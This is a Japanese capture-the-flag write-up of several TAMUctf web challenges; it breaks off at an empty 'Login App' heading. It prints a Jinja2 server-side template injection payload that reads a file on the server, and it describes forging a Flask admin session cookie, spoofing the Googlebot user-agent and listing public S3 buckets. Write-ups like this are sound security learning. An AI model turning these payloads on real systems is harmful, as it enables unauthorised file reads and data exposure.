# Science

```
http://web3.tamuctf.com

Difficulty: medium
```

* アプリケーションサーバがFlask、テンプレートエンジンがjinja2で構成されているWebページの脆弱性をつく。
* テキストボックスに文字を入れてボタンを押すと、次のページでその文字列が表示される。
* 文字列のサニタイジングが効いていないようで、{{config}}を打つと、いろいろな情報が出てくる。

```
<Config {'JSON_AS_ASCII': True
 'O_DSYNC': 4096
 'O_RSYNC': 1052672
 'EX_IOERR': 74
 'EX_NOHOST': 68
 'O_RDONLY': 0
 'ST_SYNCHRONOUS': 16
 'SESSION_REFRESH_EACH_REQUEST': True
 'EX_TEMPFAIL': 75
 'WCOREDUMP': <built-in function WCOREDUMP>
 'SEEK_CUR': 1
 'O_LARGEFILE': 0
 'ST_RELATIME': 4096
 'SECERT_KEY': 'super-secret'
 'O_EXCL': 128
 'O_TRUNC': 512
 'EX_OSFILE': 72
 'WIFEXITED': <built-in function WIFEXITED>
 'ST_MANDLOCK': 64
 'ST_NODIRATIME': 2048
 'F_OK': 0
 'WFT_CSRF_ENABLED': True
 'ST_RDONLY': 1
 'EX_NOINPUT': 66
 'O_NOFOLLOW': 131072
 'ST_NOSUID': 2
 'O_CREAT': 64
 'O_SYNC': 1052672
 'EX_NOPERM': 77
 'O_WRONLY': 1
 'SESSION_COOKIE_DOMAIN': None
 'SESSION_COOKIE_NAME': 'session'
 'WNOHANG': 1
 'LOGGER_HANDLER_POLICY': 'always'
 'O_NOATIME': 262144
 'TMP_MAX': 238328
 'MAX_CONTENT_LENGTH': None
 'ST_WRITE': 128
 'WTERMSIG': <built-in function WTERMSIG>
 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31)
 'P_NOWAITO': 1
 'R_OK': 4
 'TRAP_HTTP_EXCEPTIONS': False
 'WUNTRACED': 2
 'PRESERVE_CONTEXT_ON_EXCEPTION': None
 'EX_OSERR': 71
 'EX_DATAERR': 65
 'ST_APPEND': 256
 'SESSION_COOKIE_PATH': None
 'ST_NOATIME': 1024
 'W_OK': 2
 'EX_OK': 0
 'O_APPEND': 1024
 'EX_CANTCREAT': 73
 'O_NOCTTY': 256
 'LOGGER_NAME': 'tamuctf'
 'O_NONBLOCK': 2048
 'SECRET_KEY': None
 'EX_UNAVAILABLE': 69
 'EX_CONFIG': 78
 'P_NOWAIT': 1
 'APPLICATION_ROOT': None
 'SERVER_NAME': None
 'PREFERRED_URL_SCHEME': 'http'
 'ST_NODEV': 4
 'TESTING': False
 'TEMPLATES_AUTO_RELOAD': None
 'JSONIFY_MIMETYPE': 'application/json'
 'WEXITSTATUS': <built-in function WEXITSTATUS>
 'NGROUPS_MAX': 65536
 'WIFCONTINUED': <built-in function WIFCONTINUED>
 'O_RDWR': 2
 'P_WAIT': 0
 'O_NDELAY': 2048
 'USE_X_SENDFILE': False
 'EX_NOUSER': 67
 'SEEK_SET': 0
 'SESSION_COOKIE_SECURE': False
 'O_DIRECT': 16384
 'EX_SOFTWARE': 70
 'WSTOPSIG': <built-in function WSTOPSIG>
 'WIFSIGNALED': <built-in function WIFSIGNALED>
 'DEBUG': False
 'O_ASYNC': 8192
 'EXPLAIN_TEMPLATE_LOADING': False
 'O_DIRECTORY': 65536
 'WCONTINUED': 8
 'SEEK_END': 2
 'ST_NOEXEC': 8
 'JSONIFY_PRETTYPRINT_REGULAR': True
 'PROPAGATE_EXCEPTIONS': None
 'TRAP_BAD_REQUEST_ERRORS': False
 'JSON_SORT_KEYS': True
 'WIFSTOPPED': <built-in function WIFSTOPPED>
 'SESSION_COOKIE_HTTPONLY': True
 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0
 43200)
 'EX_PROTOCOL': 76
 'EX_USAGE': 64
 'X_OK': 1}>
```

* Flaskに対する攻撃は[このページ](https://qiita.com/koki-sato/items/6ff94197cf96d50b5d8f)に載っていた。

* これをもとに、[このコード](https://github.com/nannany/python/blob/master/src/ctf/tamu2019/flask_session.py)でcookieにsessionがキーで、 { 'username': 'admin' }がバリューに入れてアクセスしてみる。→ダメ。

* SSTI（サーバーサイドテンプレートインジェクション）と呼ばれる脆弱性のようだ。

* `{{''.__class__.__mro__[2].__subclasses__()[40]('flag.txt').read()}}`という文字列を与えてやるとフラグが得られる。
  * `''.__class__`で空文字の型が得られる。→str
  * mroはMethod Resolution Order（メソッド解決順序）とよばれるもので、`__mro__`の中にはobject型が入っている
  * `__subclasses()`メソッドでobjectのサブクラスが全取得できる。その中の41番目はfile型
  * fileの引数にフラグファイルをとってやり、読み込むとフラグが出てくる。

## 得られた学び

* pythonの知識
* SSTIについて。(ここが参考になりそう)[https://www.we45.com/blog/server-side-template-injection-a-crash-course-]

# Robots Rule

```
http://web5.tamuctf.com

Difficulty: easy
```

* `http://web5.tamuctf.com/robots.txt`にアクセスすると以下のように出る。

```
User-agent: *

WHAT IS UP, MY FELLOW HUMAN! HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?! YOU CAN TELL ME, A FELLOW NOT-A-ROBOT!
```

* User-agentをGooglebotにしてやって、`http://web5.tamuctf.com/robots.txt`にアクセスするとフラグが表示される。

## 得られた学び

* fiddlerの使い方。
  * 起動させると勝手に8888ポートでプロキシとして作動する。
  * F11をおすと、通信にブレークポイントはれるようになる。
  * Shift-F11でブレークポイント解除できる。
* robots.txtの役割
  * 検索エンジンのクローラへのアクセス制限をかけるためのファイル。
  * だいたい、User-Agentで判断してアクセスを拒否するか許可するかきめる。

# Many Gig'ems to you!

```
http://web7.tamuctf.com
```

* クッキーがいっぱい出てくるページに行くと、JS経由でクッキーが4つブラウザに保存される
* それぞれのページのaltに含まれている値と、cookieのキーの値で、重複がないものを集めて類推するとフラグが導かれる。

## 得られた学び

* あんまりないな

# Buckets

```
Checkout my s3 bucket website!
http://tamuctf.s3-website-us-west-2.amazonaws.com/

Difficulty: easy
```

* htmlソース内に他のWebページのURLが貼ってある。
`http://ctfdevbucket.s3-website.us-east-2.amazonaws.com`

* S3の一覧が`http://tamuctf.s3.amazonaws.com/`で得られる。そこからたどっていけばフラグが得られる。

## 得られた学び

* S3配下にあるファイルのリストは、
http://s3.amazonaws.com/[bucket_name]/
http://[bucket_name].s3.amazonaws.com/
のいずれかにある模様。


# Login App
